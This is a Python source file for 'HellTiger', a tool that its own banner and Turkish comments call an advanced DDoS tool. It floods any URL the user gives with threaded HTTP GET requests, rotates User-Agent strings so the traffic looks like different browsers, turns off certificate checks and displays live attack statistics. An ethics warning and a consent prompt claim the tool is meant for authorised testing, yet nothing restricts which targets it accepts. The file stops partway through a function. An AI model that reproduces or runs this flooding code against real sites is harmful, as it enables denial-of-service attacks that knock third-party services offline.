#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HellTiger - Gelişmiş Askeri Sınıf DDOS Aracı
Geliştirici: kodclub
Versiyon: 2.0

Bu araç yalnızca kontrollü eğitim ortamlarında, etik sınırlar dahilinde
ve yasal test senaryolarında kullanılmak üzere geliştirilmiştir.
"""

import threading
import requests
import random
import time
import argparse
import sys
import signal
import os
import psutil
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from urllib.parse import urlparse

# GPU kullanımı için (opsiyonel)
try:
    import GPUtil
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

# SSL uyarılarını bastır (test ortamı için)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Terminal renk kodları"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GRAY = '\033[90m'
    END = '\033[0m'

class SystemMonitor:
    """Sistem kaynak monitörü"""
    
    def __init__(self):
        self.cpu_history = []
        self.ram_history = []
        self.gpu_history = []
        self.max_history = 60  # Son 60 saniye

    def get_cpu_usage(self):
        """CPU kullanım yüzdesi"""
        try:
            return psutil.cpu_percent(interval=None)
        except (PermissionError, OSError) as e:
            # Termux ve Android ortamlarında /proc/stat erişim sorunu
            try:
                # Alternatif yöntem: loadavg kullan
                with open('/proc/loadavg', 'r') as f:
                    load_avg = float(f.read().split()[0])
                    # Load average'ı CPU yüzdesine yaklaştır
                    cpu_count = psutil.cpu_count() or 1
                    cpu_percent = min((load_avg / cpu_count) * 100, 100)
                    return cpu_percent
            except:
                # Son çare: sabit değer döndür
                return 0.0

    def get_ram_usage(self):
        """RAM kullanım bilgileri"""
        try:
            memory = psutil.virtual_memory()
            return {
                'percent': memory.percent,
                'used': memory.used / (1024**3),  # GB
                'total': memory.total / (1024**3),  # GB
                'available': memory.available / (1024**3)  # GB
            }
        except (PermissionError, OSError) as e:
            # Termux ve Android ortamlarında bellek bilgisi erişim sorunu
            try:
                # Alternatif yöntem: /proc/meminfo kullan
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                    
                # MemTotal ve MemAvailable değerlerini çıkar
                total_match = None
                available_match = None
                for line in meminfo.split('\n'):
                    if line.startswith('MemTotal:'):
                        total_match = int(line.split()[1]) * 1024  # kB to bytes
                    elif line.startswith('MemAvailable:'):
                        available_match = int(line.split()[1]) * 1024  # kB to bytes
                    elif line.startswith('MemFree:') and available_match is None:
                        available_match = int(line.split()[1]) * 1024  # kB to bytes
                
                if total_match and available_match:
                    used = total_match - available_match
                    percent = (used / total_match) * 100
                    return {
                        'percent': percent,
                        'used': used / (1024**3),  # GB
                        'total': total_match / (1024**3),  # GB
                        'available': available_match / (1024**3)  # GB
                    }
            except:
                pass
            
            # Son çare: varsayılan değerler döndür
            return {
                'percent': 50.0,
                'used': 2.0,
                'total': 4.0,
                'available': 2.0
            }

    def get_gpu_usage(self):
        """GPU kullanım bilgileri"""
        if not GPU_AVAILABLE:
            return None
        
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gpu = gpus[0]  # İlk GPU'yu al
                return {
                    'percent': gpu.load * 100,
                    'memory_used': gpu.memoryUsed,
                    'memory_total': gpu.memoryTotal,
                    'temperature': gpu.temperature
                }
        except Exception:
            pass
        return None

    def update_history(self):
        """Geçmiş verileri güncelle"""
        cpu = self.get_cpu_usage()
        ram = self.get_ram_usage()
        gpu = self.get_gpu_usage()
        
        self.cpu_history.append(cpu)
        self.ram_history.append(ram['percent'])
        
        if gpu:
            self.gpu_history.append(gpu['percent'])
        
        # Geçmiş verilerini sınırla
        if len(self.cpu_history) > self.max_history:
            self.cpu_history.pop(0)
        if len(self.ram_history) > self.max_history:
            self.ram_history.pop(0)
        if len(self.gpu_history) > self.max_history:
            self.gpu_history.pop(0)

class HellTigerCore:
    """HellTiger ana sınıfı"""
    
    def __init__(self):
        self.is_running = False
        self.start_time = None
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'status_codes': defaultdict(int),
            'errors': defaultdict(int)
        }
        self.stats_lock = threading.Lock()
        self.system_monitor = SystemMonitor()
        
        # User-Agent listesi
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ]
        
        # Sinyal yakalayıcı
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def display_banner(self):
        banner = f"""{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════════════╗
║  {Colors.YELLOW}██   ██ ███████ ██      ██      ████████ ██  ██████  ███████ ██████   {Colors.RED}     ║
║  {Colors.YELLOW}██   ██ ██      ██      ██         ██    ██ ██       ██      ██   ██  {Colors.RED}     ║
║  {Colors.YELLOW}███████ █████   ██      ██         ██    ██ ██   ███ █████   ██████   {Colors.RED}     ║
║  {Colors.YELLOW}██   ██ ██      ██      ██         ██    ██ ██    ██ ██      ██   ██  {Colors.RED}     ║
║  {Colors.YELLOW}██   ██ ███████ ███████ ███████    ██    ██  ██████  ███████ ██   ██  {Colors.RED}     ║
╠════════════════════════════════════════════════════════════════════════════════════╣
║  {Colors.CYAN}{Colors.BOLD}🔥  G E L İ Ş M İ Ş   D D O S   A R A C I   -   V E R S İ Y O N  2 . 0  🔥{Colors.RED}   ║
╠════════════════════════════════════════════════════════════════════════════════════╣
║  {Colors.WHITE}📧  Geliştirici    : kodclub                                                  {Colors.RED}║
║  {Colors.WHITE}🎯  Kullanım Amacı : Yalnızca kontrollü ve etik eğitim ortamları                 {Colors.RED}║
║  {Colors.GRAY}⚡  Özellikler     : Gerçek Zamanlı İzleme | Yük Analizi | Protokol Tespiti     {Colors.RED}║
╚════════════════════════════════════════════════════════════════════════════════════╝{Colors.END}
    """
        print(banner)

    
    def display_ethics_warning(self):
        """Etik kullanım uyarısı"""
        warning = f"""
{Colors.RED}{Colors.BOLD}⚠️  ETİK KULLANIM UYARISI ⚠️{Colors.END}

{Colors.YELLOW}Bu araç yalnızca aşağıdaki koşullarda kullanılabilir:{Colors.END}

{Colors.GREEN}✓{Colors.END} Kendi sahip olduğunuz sistemlerde
{Colors.GREEN}✓{Colors.END} Açık izin alınmış test ortamlarında
{Colors.GREEN}✓{Colors.END} Kontrollü eğitim laboratuvarlarında
{Colors.GREEN}✓{Colors.END} Yasal penetrasyon testlerinde

{Colors.RED}✗{Colors.END} İzinsiz sistemlerde kullanım {Colors.RED}KESİNLİKLE YASAKTIR{Colors.END}
{Colors.RED}✗{Colors.END} Bu aracın kötüye kullanımından {Colors.RED}KULLANICI SORUMLUDUR{Colors.END}

{Colors.CYAN}Bu aracı kullanarak yukarıdaki şartları kabul ettiğinizi beyan edersiniz.{Colors.END}
        """
        
        print(warning)
        
        while True:
            consent = input(f"{Colors.YELLOW}Etik kullanım şartlarını kabul ediyor musunuz? (EVET/hayır): {Colors.END}").strip()
            if consent.upper() in ['EVET', 'YES', 'Y']:
                print(f"{Colors.GREEN}[✓] Etik kullanım şartları kabul edildi.{Colors.END}\n")
                break
            elif consent.upper() in ['HAYIR', 'NO', 'N', '']:
                print(f"{Colors.RED}[!] Etik şartlar kabul edilmediği için program sonlandırılıyor.{Colors.END}")
                sys.exit(1)
            else:
                print(f"{Colors.RED}[!] Lütfen 'EVET' veya 'hayır' yazın.{Colors.END}")

    def validate_target(self, target_url):
        """Hedef URL doğrulama"""
        try:
            parsed = urlparse(target_url)
            if not parsed.scheme:
                target_url = "http://" + target_url
                parsed = urlparse(target_url)
            
            if not parsed.netloc:
                raise ValueError("Geçersiz URL formatı")
            
            return target_url
        except Exception as e:
            raise ValueError(f"URL doğrulama hatası: {e}")

    def generate_headers(self):
        """Rastgele HTTP başlıkları oluştur"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }

    def send_request(self, target_url, timeout=5):
        """Tek HTTP isteği gönder"""
        try:
            start_time = time.time()
            response = requests.get(
                target_url,
                headers=self.generate_headers(),
                timeout=timeout,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start_time
            
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['successful_requests'] += 1
                self.stats['response_times'].append(response_time)
                self.stats['status_codes'][response.status_code] += 1
            
            return True, response.status_code, response_time
            
        except requests.exceptions.Timeout:
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['failed_requests'] += 1
                self.stats['errors']['Timeout'] += 1
            return False, 'Timeout', 0
            
        except requests.exceptions.ConnectionError:
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['failed_requests'] += 1
                self.stats['errors']['Connection Error'] += 1
            return False, 'Connection Error', 0
            
        except Exception as e:
            with self.stats_lock:
                self.stats['total_requests'] += 1
                self.stats['failed_requests'] += 1
                self.stats['errors'][str(type(e).__name__)] += 1
            return False, str(type(e).__name__), 0

    def format_time_remaining(self, seconds):
        """Kalan süreyi formatla"""
        if seconds < 60:
            return f"{int(seconds)} saniye"
        elif seconds < 3600:
            minutes = int(seconds // 60)
            secs = int(seconds % 60)
            return f"{minutes} dakika {secs} saniye"
        else:
            hours = int(seconds // 3600)
            minutes = int((seconds % 3600) // 60)
            secs = int(seconds % 60)
            return f"{hours} saat {minutes} dakika {secs} saniye"

    def create_progress_bar(self, elapsed, total_duration, width=40):
        """İlerleme çubuğu oluştur"""
        progress = min(elapsed / total_duration, 1.0)
        filled = int(width * progress)
        bar = "█" * filled + "░" * (width - filled)
        percentage = progress * 100
        return f"[{bar}] {percentage:5.1f}%"

    def draw_system_table(self):
        """Sistem kaynak tablosu çiz"""
        # Sistem verilerini güncelle
        self.system_monitor.update_history()
        
        cpu_usage = self.system_monitor.get_cpu_usage()
        ram_info = self.system_monitor.get_ram_usage()
        gpu_info = self.system_monitor.get_gpu_usage()
        
        # CPU renk belirleme
        if cpu_usage < 30:
            cpu_color = Colors.GREEN
        elif cpu_usage < 70:
            cpu_color = Colors.YELLOW
        else:
            cpu_color = Colors.RED
        
        # RAM renk belirleme
        if ram_info['percent'] < 50:
            ram_color = Colors.GREEN
        elif ram_info['percent'] < 80:
            ram_color = Colors.YELLOW
        else:
            ram_color = Colors.RED
        
        print(f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                        SİSTEM KAYNAK MONİTÖRÜ                         {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠═══════════════════════════════════════════════════════════════════════╣{Colors.END}")
        
        # CPU Satırı
        cpu_bar = "█" * int(cpu_usage / 5) + "░" * (20 - int(cpu_usage / 5))
        try:
            cpu_count = psutil.cpu_count()
        except (PermissionError, OSError):
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpu_count = len([line for line in f if line.startswith('processor')])
            except:
                cpu_count = 4
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🖥️  CPU:{Colors.END} {cpu_color}[{cpu_bar}] {cpu_usage:5.1f}%{Colors.END} {Colors.GRAY}({cpu_count} çekirdek){Colors.END} {Colors.CYAN}║{Colors.END}")
        
        # RAM Satırı
        ram_bar = "█" * int(ram_info['percent'] / 5) + "░" * (20 - int(ram_info['percent'] / 5))
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🧠 RAM:{Colors.END} {ram_color}[{ram_bar}] {ram_info['percent']:5.1f}%{Colors.END} {Colors.GRAY}({ram_info['used']:.1f}/{ram_info['total']:.1f} GB){Colors.END} {Colors.CYAN}║{Colors.END}")
        
        # GPU Satırı (varsa)
        if gpu_info:
            if gpu_info['percent'] < 30:
                gpu_color = Colors.GREEN
            elif gpu_info['percent'] < 70:
                gpu_color = Colors.YELLOW
            else:
                gpu_color = Colors.RED
            
            gpu_bar = "█" * int(gpu_info['percent'] / 5) + "░" * (20 - int(gpu_info['percent'] / 5))
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎮 GPU:{Colors.END} {gpu_color}[{gpu_bar}] {gpu_info['percent']:5.1f}%{Colors.END} {Colors.GRAY}({gpu_info['memory_used']}/{gpu_info['memory_total']} MB){Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🌡️  Sıc:{Colors.END} {Colors.YELLOW}{gpu_info['temperature']}°C{Colors.END}                                            {Colors.CYAN}║{Colors.END}")
        else:
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎮 GPU:{Colors.END} {Colors.GRAY}Mevcut değil                                        {Colors.CYAN}║{Colors.END}")
        
        print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════╝{Colors.END}")

    def display_real_time_stats(self, total_duration):
        """Gerçek zamanlı istatistik görüntüleme"""
        last_count = 0
        
        while self.is_running:
            time.sleep(1)
            
            with self.stats_lock:
                current_count = self.stats['total_requests']
                success_count = self.stats['successful_requests']
                failed_count = self.stats['failed_requests']
                response_times = self.stats['response_times']
            
            rps = current_count - last_count
            success_rate = (success_count / current_count * 100) if current_count > 0 else 0
            avg_response = sum(response_times[-100:]) / len(response_times[-100:]) if response_times else 0
            
            # Zaman hesaplamaları
            elapsed = time.time() - self.start_time
            remaining = max(0, total_duration - elapsed)
            progress_bar = self.create_progress_bar(elapsed, total_duration)
            
            # Ekranı temizle
            os.system('clear' if os.name == 'posix' else 'cls')
            self.display_banner()
            
            # Sistem kaynak tablosu
            self.draw_system_table()
            
            print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                        TRAFİK ANALİZ PANOSU                          {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠═══════════════════════════════════════════════════════════════════════╣{Colors.END}")
            
            # İlerleme çubuğu
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📊 İlerleme:{Colors.END} {Colors.GREEN}{progress_bar}{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⏱️  Geçen:{Colors.END} {Colors.YELLOW}{self.format_time_remaining(elapsed)}{Colors.END}                     {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⏳ Kalan:{Colors.END} {Colors.YELLOW}{self.format_time_remaining(remaining)}{Colors.END}                     {Colors.CYAN}║{Colors.END}")
            
            print(f"{Colors.CYAN}╠═══════════════════════════════════════════════════════════════════════╣{Colors.END}")
            
            # Performans metrikleri - iki sütunlu düzen
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🚀 Anlık RPS:{Colors.END} {Colors.GREEN}{rps:>8}{Colors.END}     {Colors.BOLD}📈 Ortalama Yanıt:{Colors.END} {Colors.CYAN}{avg_response:>6.3f}s{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎯 Toplam İstek:{Colors.END} {Colors.YELLOW}{current_count:>6}{Colors.END}     {Colors.BOLD}✅ Başarı Oranı:{Colors.END} {Colors.GREEN}{success_rate:>7.1f}%{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}✔️  Başarılı:{Colors.END} {Colors.GREEN}{success_count:>8}{Colors.END}     {Colors.BOLD}❌ Başarısız:{Colors.END} {Colors.RED}{failed_count:>10}{Colors.END} {Colors.CYAN}║{Colors.END}")
            
            print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════╝{Colors.END}")
            
            # Durum mesajı
            if remaining > 0:
                intensity_indicator = "🔥" if rps > 100 else "⚡" if rps > 50 else "🔸"
                print(f"\n{Colors.BOLD}{intensity_indicator} Test devam ediyor... Durdurmak için {Colors.RED}Ctrl+C{Colors.END}{Colors.BOLD} tuşlarına basın{Colors.END}")
            
            last_count = current_count

    def traffic_worker(self, target_url, duration, timeout):
        """İş parçacığı çalışan fonksiyonu"""
        end_time = time.time() + duration
        
        while self.is_running and time.time() < end_time:
            self.send_request(target_url, timeout)
            # Dinamik bekleme süresi
            time.sleep(random.uniform(0.001, 0.05))

    def generate_final_report(self, target_url, duration):
        """Test sonucu raporu oluştur"""
        with self.stats_lock:
            total_requests = self.stats['total_requests']
            successful_requests = self.stats['successful_requests']
            failed_requests = self.stats['failed_requests']
            response_times = self.stats['response_times']
            status_codes = self.stats['status_codes']
            errors = self.stats['errors']
        
        # İstatistik hesaplamaları
        success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        min_response_time = min(response_times) if response_times else 0
        max_response_time = max(response_times) if response_times else 0
        rps_avg = total_requests / duration if duration > 0 else 0
        
        # Son sistem durumu
        final_cpu = self.system_monitor.get_cpu_usage()
        final_ram = self.system_monitor.get_ram_usage()
        final_gpu = self.system_monitor.get_gpu_usage()
        
        # Ekranı temizle ve rapor başlat
        os.system('clear' if os.name == 'posix' else 'cls')
        self.display_banner()
        
        print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.YELLOW}                           HELLTİGER TEST RAPORU                            {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎯 Hedef URL:{Colors.END} {Colors.YELLOW}{target_url[:50]:<50}{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⏱️  Test Süresi:{Colors.END} {Colors.YELLOW}{self.format_time_remaining(duration):<50}{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📅 Test Tarihi:{Colors.END} {Colors.YELLOW}{datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50}{Colors.END} {Colors.CYAN}║{Colors.END}")
        
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                              PERFORMANS METRİKLERİ                          {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        
        # Performans tablosu - iki sütunlu
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📊 Toplam İstek Sayısı:{Colors.END} {Colors.YELLOW}{total_requests:>12,}{Colors.END}     {Colors.BOLD}🚀 Ortalama RPS:{Colors.END} {Colors.GREEN}{rps_avg:>10.2f}{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}✅ Başarılı İstek:{Colors.END} {Colors.GREEN}{successful_requests:>16,}{Colors.END}     {Colors.BOLD}❌ Başarısız:{Colors.END} {Colors.RED}{failed_requests:>13,}{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📈 Başarı Oranı:{Colors.END} {Colors.GREEN}{success_rate:>18.2f}%{Colors.END}    {Colors.BOLD}⚡ Ort. Yanıt:{Colors.END} {Colors.CYAN}{avg_response_time:>10.3f}s{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⚡ En Hızlı Yanıt:{Colors.END} {Colors.GREEN}{min_response_time:>14.3f}s{Colors.END}    {Colors.BOLD}🐌 En Yavaş:{Colors.END} {Colors.RED}{max_response_time:>12.3f}s{Colors.END} {Colors.CYAN}║{Colors.END}")
        
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                             SİSTEM KAYNAK DURUMU                           {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🖥️  Son CPU Kullanımı:{Colors.END} {Colors.YELLOW}{final_cpu:>13.1f}%{Colors.END}    {Colors.BOLD}🧠 RAM Kullanımı:{Colors.END} {Colors.YELLOW}{final_ram['percent']:>11.1f}%{Colors.END} {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}💾 RAM Kullanılan:{Colors.END} {Colors.YELLOW}{final_ram['used']:>15.1f} GB{Colors.END}  {Colors.BOLD}💽 RAM Toplam:{Colors.END} {Colors.CYAN}{final_ram['total']:>13.1f} GB{Colors.END} {Colors.CYAN}║{Colors.END}")
        
        if final_gpu:
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎮 GPU Kullanımı:{Colors.END} {Colors.YELLOW}{final_gpu['percent']:>15.1f}%{Colors.END}    {Colors.BOLD}🌡️  GPU Sıcaklık:{Colors.END} {Colors.RED}{final_gpu['temperature']:>10}°C{Colors.END} {Colors.CYAN}║{Colors.END}")
        
        # HTTP Durum Kodları
        if status_codes:
            print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                            HTTP DURUM KODLARI                             {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            
            for code, count in sorted(status_codes.items()):
                percentage = (count / total_requests * 100) if total_requests > 0 else 0
                code_color = Colors.GREEN if code == 200 else Colors.YELLOW if code < 400 else Colors.RED
                print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📋 HTTP {code}:{Colors.END} {code_color}{count:>20,} ({percentage:>5.1f}%){Colors.END}                     {Colors.CYAN}║{Colors.END}")
        
        # Hata Analizi
        if errors:
            print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                               HATA ANALİZİ                                {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            
            for error, count in sorted(errors.items()):
                percentage = (count / total_requests * 100) if total_requests > 0 else 0
                print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🚨 {error}:{Colors.END} {Colors.RED}{count:>20,} ({percentage:>5.1f}%){Colors.END}                     {Colors.CYAN}║{Colors.END}")
        
        print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Performans değerlendirmesi
        print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                           PERFORMANS DEĞERLENDİRMESİ                       {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        
        # Performans skoru hesaplama
        perf_score = 0
        if success_rate > 95:
            perf_score += 40
            stability_status = f"{Colors.GREEN}🟢 Mükemmel{Colors.END}"
        elif success_rate > 85:
            perf_score += 30
            stability_status = f"{Colors.YELLOW}🟡 İyi{Colors.END}"
        else:
            perf_score += 10
            stability_status = f"{Colors.RED}🔴 Zayıf{Colors.END}"
        
        if avg_response_time < 1.0:
            perf_score += 30
            speed_status = f"{Colors.GREEN}🟢 Hızlı{Colors.END}"
        elif avg_response_time < 3.0:
            perf_score += 20
            speed_status = f"{Colors.YELLOW}🟡 Normal{Colors.END}"
        else:
            perf_score += 5
            speed_status = f"{Colors.RED}🔴 Yavaş{Colors.END}"
        
        if rps_avg > 100:
            perf_score += 30
            throughput_status = f"{Colors.GREEN}🟢 Yüksek{Colors.END}"
        elif rps_avg > 50:
            perf_score += 20
            throughput_status = f"{Colors.YELLOW}🟡 Orta{Colors.END}"
        else:
            perf_score += 10
            throughput_status = f"{Colors.RED}🔴 Düşük{Colors.END}"
        
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎯 Kararlılık:{Colors.END} {stability_status}                    {Colors.BOLD}⚡ Hız:{Colors.END} {speed_status}                {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}📊 Üretkenlik:{Colors.END} {throughput_status}                   {Colors.BOLD}🏆 Genel Skor:{Colors.END} {Colors.CYAN}{perf_score}/100{Colors.END}            {Colors.CYAN}║{Colors.END}")
        
        print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.GREEN}✨ Rapor başarıyla oluşturuldu - {datetime.now().strftime('%H:%M:%S')}{Colors.END}")
        print(f"{Colors.YELLOW}🔥 HellTiger v2.0 - kodclup tarafından geliştirilmiştir{Colors.END}")

    def signal_handler(self, signum, frame):
        """Sinyal yakalayıcı (Ctrl+C)"""
        print(f"\n{Colors.YELLOW}[!] Test durdurma sinyali alındı...{Colors.END}")
        self.is_running = False

    def run_test(self, target_url, threads=50, duration=60, timeout=5):
        """Ana test fonksiyonu"""
        try:
            # Hedef doğrulama
            target_url = self.validate_target(target_url)
            
            print(f"\n{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}                             TEST PARAMETRELERİ                             {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╠════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🎯 Hedef URL:{Colors.END} {Colors.YELLOW}{target_url[:55]:<55}{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}🔥 Thread Sayısı:{Colors.END} {Colors.YELLOW}{threads:<55}{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⏱️  Test Süresi:{Colors.END} {Colors.YELLOW}{self.format_time_remaining(duration):<55}{Colors.END} {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END} {Colors.BOLD}⚡ Timeout Süresi:{Colors.END} {Colors.YELLOW}{timeout} saniye{Colors.END}                                       {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
            
            # Yoğunluk seviyesi göstergesi
            if threads > 200:
                intensity = f"{Colors.RED}🔴 AŞIRI YÜKSEK"
                warning = f"{Colors.RED}⚠️  DİKKAT: Çok yüksek thread sayısı sistem performansını etkileyebilir!"
            elif threads > 100:
                intensity = f"{Colors.RED}🟠 YÜKSEK"
                warning = f"{Colors.YELLOW}⚠️  Yüksek yoğunluk seviyesi - sistem kaynaklarını izleyin"
            elif threads > 50:
                intensity = f"{Colors.YELLOW}🟡 ORTA"
                warning = f"{Colors.GREEN}✓ Dengeli yoğunluk seviyesi"
            else:
                intensity = f"{Colors.GREEN}🟢 DÜŞÜK"
                warning = f"{Colors.GREEN}✓ Güvenli yoğunluk seviyesi"
            
            print(f"\n{Colors.BOLD}📊 Yoğunluk Seviyesi: {intensity}{Colors.END}")
            print(f"{warning}{Colors.END}")
            
            print(f"\n{Colors.YELLOW}[*] Test başlatılıyor...{Colors.END}")
            time.sleep(3)
            
            self.is_running = True
            self.start_time = time.time()
            
            # Gerçek zamanlı istatistik thread'i
            stats_thread = threading.Thread(target=self.display_real_time_stats, args=(duration,), daemon=True)
            stats_thread.start()
            
            # Ana thread executor ile test çalıştır
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [
                    executor.submit(self.traffic_worker, target_url, duration, timeout)
                    for _ in range(threads)
                ]
                
                # Test süresini bekle veya interrupt sinyali al
                time.sleep(duration)
                self.is_running = False
                
                # Tüm thread'lerin bitmesini bekle
                for future in as_completed(futures, timeout=10):
                    try:
                        future.result()
                    except Exception:
                        pass
            
            # Test tamamlandı
            actual_duration = time.time() - self.start_time
            
            # Final raporu göster
            self.generate_final_report(target_url, actual_duration)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Test kullanıcı tarafından durduruldu.{Colors.END}")
            if self.start_time:
                actual_duration = time.time() - self.start_time
                self.generate_final_report(target_url, actual_duration)
        except Exception as e:
